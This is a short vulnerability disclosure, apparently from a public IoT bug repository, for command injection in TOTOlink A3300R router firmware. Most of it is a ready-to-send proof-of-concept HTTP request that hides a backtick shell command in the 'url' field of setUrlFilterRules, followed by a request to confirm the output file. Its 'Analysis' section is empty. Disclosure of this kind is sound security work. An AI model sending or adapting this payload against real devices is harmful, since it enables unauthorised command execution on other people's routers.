# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setUrlFilterRules` request,`url` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=14059020E1AF92EC HTTP/1.1
Host: itotolink.net
Content-Length: 90
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/urlf.html?token=14059020E1AF92EC
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"url":"funny-mud-peee`ls>/web/cmdi9.txt`","addEffect":"1","topicurl":"setUrlFilterRules"}
```

injection the command "ls>/web/cmdi9.txt"

![image-20240119133213218](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/9/img/image-20240119133213218.png)

check the result.

```
GET /cmdi9.txt HTTP/1.1
Host: itotolink.net
If-Modified-Since: Mon, 24 Oct 2022 09:43:03 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/css,*/*;q=0.1
Referer: http://itotolink.net/advance/urlf.html?token=14059020E1AF92EC
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![image-20240119133218122](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/9/img/image-20240119133218122.png)

## Analysis



